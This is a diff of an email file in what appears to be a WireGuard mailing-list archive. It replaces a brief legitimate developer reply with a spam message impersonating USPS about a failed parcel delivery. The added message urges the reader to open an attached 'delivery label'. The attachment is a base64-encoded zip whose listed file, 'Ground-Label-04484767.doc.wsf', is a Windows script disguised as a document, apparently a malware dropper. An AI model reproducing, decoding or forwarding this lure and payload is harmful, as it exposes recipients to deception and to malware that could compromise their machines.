@@ -1,30 +1,20 @@
-Return-Path: Jason@zx2c4.com
+Return-Path: gamesfleadh-ie@gamesfleadh.ie
 Received: from krantz.zx2c4.com (localhost [127.0.0.1])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 46aa1c36
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 89925859
  for <wireguard@lists.zx2c4.com>;
- Tue, 27 Dec 2016 04:59:12 +0000 (UTC)
-Received: from frisell.zx2c4.com (frisell.zx2c4.com [192.95.5.64])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 0433f684
+ Tue, 27 Dec 2016 08:13:38 +0000 (UTC)
+Received: from plesk3.heanet.ie (shang.heanet.ie [193.1.193.205])
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 65be8af5
  for <wireguard@lists.zx2c4.com>;
- Tue, 27 Dec 2016 04:59:12 +0000 (UTC)
-Received: by frisell.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 77b7d033
- for <wireguard@lists.zx2c4.com>;
- Tue, 27 Dec 2016 04:59:12 +0000 (UTC)
-Received: by frisell.zx2c4.com (ZX2C4 Mail Server) with ESMTPSA id 1383a2e3
- (TLSv1.2:ECDHE-RSA-AES128-GCM-SHA256:128:NO)
- for <wireguard@lists.zx2c4.com>;
- Tue, 27 Dec 2016 04:59:12 +0000 (UTC)
-Received: by mail-oi0-f48.google.com with SMTP id b126so338491031oia.2
- for <wireguard@lists.zx2c4.com>; Mon, 26 Dec 2016 21:07:06 -0800 (PST)
+ Tue, 27 Dec 2016 08:13:38 +0000 (UTC)
+To: wireguard@lists.zx2c4.com
+Subject: Parcel ID04484767 delivery problems, please review
+Date: Tue, 27 Dec 2016 08:21:30 +0000
 MIME-Version: 1.0
-In-Reply-To: <CAHmME9qR5y-5FzTuXy_V_j7V+vFDXJqpF7mV=T3=vXme187-7A@mail.gmail.com>
-References: <CAHmME9qR5y-5FzTuXy_V_j7V+vFDXJqpF7mV=T3=vXme187-7A@mail.gmail.com>
-From: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Date: Tue, 27 Dec 2016 06:07:05 +0100
-Message-ID: <CAHmME9pXrA=DvHa8kmLfhvPOKM4pO+Vq6=2FoQzoLdiqd15zrQ@mail.gmail.com>
-Subject: Re: 3.18 kernel for Android
-To: WireGuard mailing list <wireguard@lists.zx2c4.com>
-Content-Type: text/plain; charset=UTF-8
+Message-ID: <fceed7cda1671d5658c68253d26b71c2@gamesfleadh.ie>
+From: "USPS Station Management" <sean.worley@gamesfleadh.ie>
+Content-Type: multipart/mixed; boundary="b1_5c09dda239620665523bb5ae1f95efc2"
+Reply-To: USPS Station Management <sean.worley@gamesfleadh.ie>
 List-Id: Development discussion of WireGuard <wireguard.lists.zx2c4.com>
 List-Unsubscribe: <https://lists.zx2c4.com/mailman/options/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=unsubscribe>
@@ -34,6 +24,76 @@ List-Help: <mailto:wireguard-request@lists.zx2c4.com?subject=help>
 List-Subscribe: <https://lists.zx2c4.com/mailman/listinfo/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=subscribe>
 
-It works!
+--b1_5c09dda239620665523bb5ae1f95efc2
+Content-Type: text/plain; charset=us-ascii
 
-https://data.zx2c4.com/android-wg-first-starts.gif
+Dear Customer,
+
+USPS courier was unable to contact you for your parcel delivery.
+
+Please check delivery label attached!
+
+Yours respectfully,
+Sean Worley,
+USPS Office Agent.
+
+
+--b1_5c09dda239620665523bb5ae1f95efc2
+Content-Type: application/zip; name="Ground-Label-04484767.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Ground-Label-04484767.zip
+
+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
+AAIAiwAAAI4KAAAAAA==
+
+
+--b1_5c09dda239620665523bb5ae1f95efc2--
